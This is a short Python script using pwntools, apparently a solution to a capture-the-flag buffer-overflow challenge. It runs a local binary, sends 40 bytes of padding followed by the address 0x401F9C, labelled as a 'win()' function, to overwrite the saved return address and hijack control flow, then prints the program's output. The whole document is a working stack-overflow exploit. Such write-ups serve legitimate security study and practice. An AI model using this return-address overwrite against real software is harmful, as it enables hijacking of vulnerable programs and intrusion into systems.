from pwn import *
import sys

p = process(sys.argv[1])

context.arch = 'amd64'

payload = b'a' * 40 #offset from but to RA
payload += (0x401F9C).to_bytes(8, byteorder='little') #address of win()


p.send(payload)

print(p.recvallS())